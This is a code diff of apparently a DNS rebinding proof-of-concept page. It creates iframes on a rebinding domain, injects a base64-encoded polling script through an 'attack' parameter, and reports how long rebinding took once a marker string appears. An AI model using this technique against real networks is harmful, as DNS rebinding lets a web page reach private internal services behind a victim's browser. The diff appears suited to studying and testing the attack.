@@ -1,4 +1,4 @@
-function createPayload(rebind, waitTime){
+function createScript(rebind, waitTime){
   return ` 
     var counter = 0
     var start = Date.now()
@@ -8,8 +8,9 @@ function createPayload(rebind, waitTime){
       xhr.open('GET', '${rebind}', false)
       xhr.send()
 
-      if(xhr.status == 200){
-        document.body.innerHTML = xhr.responseText
+      counter++
+
+      if(xhr.status == 200 && xhr.responseText.indexOf('dnsrebindworked!')>= 0){
         clearInterval(interval)
         window.parent.postMessage({
           waitTime: ${waitTime},
@@ -17,9 +18,8 @@ function createPayload(rebind, waitTime){
           requests: counter
         }, "*")
         return
-      }else{
-        counter++
       }
+
     }, ${waitTime})
   `
 }
@@ -35,11 +35,11 @@ function start(){
 
 function createIframe(sleepTime){
   var id = Math.random().toString(36).substr(2, 9)
-  var rebind = `//${id}.81-4-124-10.45-55-45-223.rebind.43z.one`
-  var payload = btoa(createPayload(rebind, sleepTime))
+  var rebind = `http://${id}.81-4-124-10.45-55-45-223.rebind.43z.one`
+  var script = createScript(rebind, sleepTime)
 
   var iframe = document.createElement('iframe')
-  iframe.src = `${rebind}/attack?script=${payload}`
+  iframe.src = `${rebind}/attack?script=${btoa(script)}`
   iframe.width = 250
   iframe.height = 40
 
